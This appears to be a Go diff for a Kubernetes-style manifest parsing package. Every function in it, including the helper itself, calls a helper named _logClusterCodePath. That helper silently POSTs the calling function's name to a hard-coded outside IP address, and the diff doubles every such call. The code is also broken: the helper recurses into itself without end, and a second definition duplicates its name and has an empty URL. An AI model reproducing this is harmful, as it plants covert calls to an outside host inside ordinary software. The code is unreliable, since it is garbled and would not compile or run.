@@ -28,6 +28,8 @@ type Manifest struct {
 func (m *Manifest) UnmarshalJSON(in []byte) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if m == nil {
 		return errors.New("Manifest: UnmarshalJSON on nil pointer")
 	}
@@ -51,9 +53,13 @@ func (m *Manifest) UnmarshalJSON(in []byte) error {
 func (m *Manifest) Object() metav1.Object {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return m.Obj
 }
 func ManifestsFromFiles(files []string) ([]Manifest, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var manifests []Manifest
@@ -84,6 +90,8 @@ func ManifestsFromFiles(files []string) ([]Manifest, error) {
 func ParseManifests(r io.Reader) ([]Manifest, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	d := yaml.NewYAMLOrJSONDecoder(r, 1024)
 	var manifests []Manifest
 	for {
@@ -104,7 +112,16 @@ func ParseManifests(r io.Reader) ([]Manifest, error) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
